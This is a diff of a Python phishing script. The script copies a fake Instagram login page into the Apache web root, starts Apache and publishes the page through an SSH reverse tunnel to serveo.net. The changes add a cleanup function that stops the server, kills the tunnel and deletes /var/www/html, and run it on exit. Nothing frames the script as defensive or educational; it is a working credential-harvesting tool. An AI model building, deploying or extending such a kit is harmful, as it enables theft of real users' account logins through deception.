@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 
-# version 2.0: - Changed some colors and look - Fixed webiste
+# version 2.1: - Added clear option - If prompt say yes(line:103) - clean on exit - made clean a function
 
 # Please update version number each time we update
 
@@ -41,7 +41,7 @@ if os.geteuid() != 0:
 
 
 def serveo_forward(): # Port forward to serveo#
-    os.system('ssh -o ServerAliveInterval=999 -R inc0gnit0:80:localhost:80 serveo.net')
+    os.system('ssh -o ServerAliveInterval=9999 -R inc0gnit0:80:localhost:80 serveo.net')
     #subprocess.Popen(["rm","-r","some.file"])
     
 def banner():
@@ -85,8 +85,19 @@ def banner():
                     
 ''')
     
+def clean():
+    print(green + '[+] Stopping Apache2 Service')
+    os.system('service apache2 stop')
+    print(green + '[+] Stopping Traffic forwarding to serveo')
+    os.system('pkill -f inc0gnit0:80:localhost:80')
+    print(green + '[+] Cleaning /var/www/html/')
+    os.system('rm -r /var/www/html/ && mkdir /var/www/html')
+    print(green + '[+] Done')
+    
 
 def main():  # Main script #
+    
+    os.system('clear')
     
     banner()
 
@@ -98,6 +109,7 @@ def main():  # Main script #
         os.system('rm -r /var/www/html/ && mkdir /var/www/html/')
         os.system('cp '+'-r '+ cwd  + '/Instagram/Instagram-Login/index.html' " /var/www/html/")
         print(green + '[+] Starting Apache2 Service')
+        print(green + '[+] If prompt, please say yes')
         os.system('service apache2 start')
         serveo_forward()
         print(green + '[+] Done')
@@ -110,13 +122,7 @@ def main():  # Main script #
         os.system('clear')
         main()
     elif choice == "clean":
-        print(green + '[+] Stopping Apache2 Service')
-        os.system('service apache2 stop')
-        print(green + '[+] Stopping Traffic forwarding to serveo')
-        os.system('pkill -f inc0gnit0:80:localhost:80')
-        print(green + '[+] Cleaning /var/www/html/')
-        os.system('rm -r /var/www/html/ && mkdir /var/www/html')
-        print(green + '[+] Done')
+        clean()
         main()
 
     
@@ -136,5 +142,6 @@ try: # This will start the script
 
 except KeyboardInterrupt: # Will detect if they exit #
     print("\n")
+    clean()
     print(red + "[!] Exiting" + reset)
     exit(0)
